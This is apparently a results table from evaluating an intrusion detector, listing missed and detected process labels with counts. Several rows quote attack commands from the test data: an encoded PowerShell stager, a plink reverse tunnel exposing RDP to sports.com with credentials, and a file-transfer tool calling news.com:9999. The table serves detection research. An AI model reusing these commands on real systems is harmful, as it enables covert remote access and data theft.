node_group,src_label,count,fraction
TP_above_threshold,subject: System,1,1.000000000
FP_above_threshold,subject: System,1,1.000000000
FN_below_threshold,subject: powershell.exe,206,0.275401070
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,124,0.165775401
FN_below_threshold,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,24,0.032085561
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,6,0.008021390
FN_below_threshold,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,4,0.005347594
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe,3,0.004010695
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE,3,0.004010695
FN_below_threshold,subject: System,3,0.004010695
FN_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/plink.exe | ""C:/Windows/system32/plink.exe"" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest",2,0.002673797
FN_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Microsoft Office/Office15/OUTLOOK.EXE,2,0.002673797
FN_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Chrome/Application/chrome.exe,2,0.002673797
FN_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/POWERPNT.EXE"" /AUTOMATION -Embedding",1,0.001336898
FN_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/lsass.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"",1,0.001336898
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | C:/Windows/System32/svchost.exe -k utcsvc,1,0.001336898
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | /SystemRoot/System32/smss.exe 000000e8 00000080 ,1,0.001336898
FN_below_threshold,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help",1,0.001336898
FN_below_threshold,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""",1,0.001336898
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe,1,0.001336898
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe,1,0.001336898
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe | C:/Windows/System32/mobsync.exe -Embedding,1,0.001336898
FN_below_threshold,subject: /SystemRoot/System32/smss.exe | fileTransfer1000.exe  news.com 9999 ,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53474,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53354,1,0.001336898
